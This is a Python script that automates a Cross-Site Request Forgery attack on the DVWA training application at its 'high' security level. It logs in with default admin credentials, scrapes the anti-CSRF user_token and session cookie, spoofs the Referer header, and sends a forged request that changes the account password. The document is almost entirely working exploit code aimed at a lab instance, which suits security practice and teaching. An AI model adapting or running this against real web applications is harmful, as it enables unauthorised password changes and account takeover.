#!../venvkali/bin/python3
# !--*--coding:utf-8--*--
__author__ = 'Cazin Christophe'

''' 
Role :  This script allow you to crack DVWA CSRF (Cross-Site Request Forgery ) platform 
        
        Connect to DVWA interface 
        Go to DVWA Security menu and Setup the high level 
        Go to CSRF menu and launch a changing of password
        To be able to do it we have to send a GET request in : 
            modifying the REFERER ( give the IP of source DVWA and not the default ) in the header
            Give a hiiden field call user_tkoken 
            Fill the form and validate 
        All is done with requests and Beautiful soup library
        
        Work only in DVWA Version 1.10 *Development* (Release date: 2015-10-08
        else you should adapt the soup filters ( response should be a bit different with other versions )
        I have used a docker image of DVWA for my tests.
'''
import requests
from termcolor import cprint
from bs4 import BeautifulSoup

# Declaration part
HOST_DVWA='172.16.13.1:81'  # Host where is DVWA
URI_DVWA='http://{}'.format(HOST_DVWA)
payload = {}
cookie = {}
# Password to change in the CSRF menu
new_password_csrf='password'


# Function part
print_ok = lambda x: cprint('# {} #'.format(x), 'green')
print_ko = lambda x: cprint('# {} #'.format(x), 'red' )
print_wh = lambda x: cprint('# {} #'.format(x), 'white' )


def main():
    # Create a session object to keep context ( cookie ) in all requests
    # We will instance all requests object from this one
    global s
    s = requests.session()
    url = '{}/login.php'.format(URI_DVWA)
    get_cookie(url)
    if get_attributes(url):
        #print_ok("get_attributes() function done")
        if login_dvwa():
            if set_secu('high'):
                csrf_high(new_password_csrf)
    else:
        print_ko("get_attributes() done")
    s.close()

def get_attributes(url):
    # Do a first GET to grab an hidden field in the page call user_token and sent with the form
    # Security to prevent scripting I guess

    r = s.get(url)
    if r.status_code == requests.codes.ok:
        # Parsing into the log in page to get the hidden token
        # into r.text
        # e.g : <input type=\'hidden\' name=\'user_token\' value=\'540d08899fd27226ac010b6c97fe91d8\' />
        soup = BeautifulSoup(r.text, 'html.parser')
        t = soup.find(attrs={'name': 'user_token'})
        if t:
            # Adding the token in payload to inject in the post
            payload['user_token']=t['value']
            print_wh('Stored hidden field user_token = {}'.format(payload['user_token']))

            return True
        else:
            print_ko('Error to soup the attributes into get_attributes function')
    else:
        print_ko("Error in get on url {} - code {}".format(url,r.status_code))

def get_cookie(url):
    """
    Do a GET to get the cookie.
    The cookie is already in the session. Not mandatory function, Just in case if you don't use session object

    :param url the url where do the get
    :return:
    """
    r = s.get(url)
    if r.status_code == requests.codes.ok:
        # Store the cookie into a dict
        cookie[r.headers['Set-Cookie'].split()[0].split('=')[0]]=r.headers['Set-Cookie'].split()[0].split('=')[1]
        print_wh('Cookie Saved = {}'.format(r.headers['Set-Cookie'].split()[0].split('=')[0]))
        return True
    else:
        print_ko("Error in get on url {} - code {}".format(url,r.status_code))

def login_dvwa():
    """
    Log in to DVWA platform
    Do a post on the form in the login page in providing dict "payload" in data parameters

    :return: None
    """
    url = '{}/login.php'.format(URI_DVWA)

    payload['password'] = 'password'
    payload['username'] = 'admin'
    payload['Login'] = 'Login'

    # Text to grab after log in to check
    WELCOME_BANNER='Welcome to Damn Vulnerable Web Application!'

    r = s.post(url, data=payload)
    if r.status_code == requests.codes.ok:
        # We are successfully logged
        if r.text.find(WELCOME_BANNER) != -1 :
            print_ok('Logged in to DVWA {} sucessfully with post method - code : {}'.format(url,r.status_code))
            return True
        else:
            print_ko('Error to soup the attributes into login_dvwa function')

    else:
        print_ko('Authentication error on DVWA {} - status code : {}'.format(r.url,r.status_code))



def set_secu(level):
    """
    Go to the DVWA Security menu and change level

    :param level : low medium high impossible
    :return : True is ok. Nothing if error.
    """
    # Filed to grab the result
    SEC_BANNER = 'Security level set to {}'.format(level)
    payload['security'] = level
    payload['seclev_submit'] = 'Submit'
    url = '{}/security.php'.format(URI_DVWA)

    r = s.post(url, data=payload )
    if r.status_code == requests.codes.ok:
        soup = BeautifulSoup(r.text, 'html.parser')
        t = soup.find(attrs={'class': 'message'})
        if t.get_text() == SEC_BANNER:
            print_ok('Security has been set to {}'.format(level))
            return True
        else:
            print_ko('Level {} semms to be not available')

def csrf_high(new_password_csrf):
    """
    Construt a GET url ( for the menu CSRF ) with :
        password_new
        password_conf : same password_new
        Change value on submit
        user_token

    Provide in the header the right Referer
    Indeed we have to change the IP to be the sane of server DVWA

    :param new_password_csrf : the new password to change
    :return : True is ok. Nothing if error.
    """
    CSRF_BANNER='Password Changed.'
    url = '{}/vulnerabilities/csrf/'.format(URI_DVWA)
    header = { 'Referer': '{}/vulnerabilities/csrf/'.format(URI_DVWA) }

    # url for low or medium security mode , no need to provide the token
    #http://172.16.13.1:81/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#


    # Get the last user_token after login to inject in the get
    get_attributes(url)
    #print('## Stored user_token : {}'.format(payload['user_token']))

    url = '{0}?password_new={1}&password_conf={1}&Change=Change&user_token={2}'.format(url, new_password_csrf, payload['user_token'])

    r = s.get(url, headers= header)
    if r.status_code == requests.codes.ok:
        soup = BeautifulSoup(r.text, 'html.parser')
        if soup.find('pre').contents[0]  == CSRF_BANNER:
            print('')
            print_ok('-'*80)
            print_ok('URL sent : {}'.format(url))
            print_ok('Password has been changed successfully to {}'.format(new_password_csrf))
            print_ok('-'*80)
            return True
        else:
            print_ko('Error to soup the attributes into csrf_high function')
    else:
        print_ko('Authentication error on DVWA {} - status code : {}'.format(r.url, r.status_code))
        print_ko('Password has not been changed')

if __name__ == '__main__':
    main()
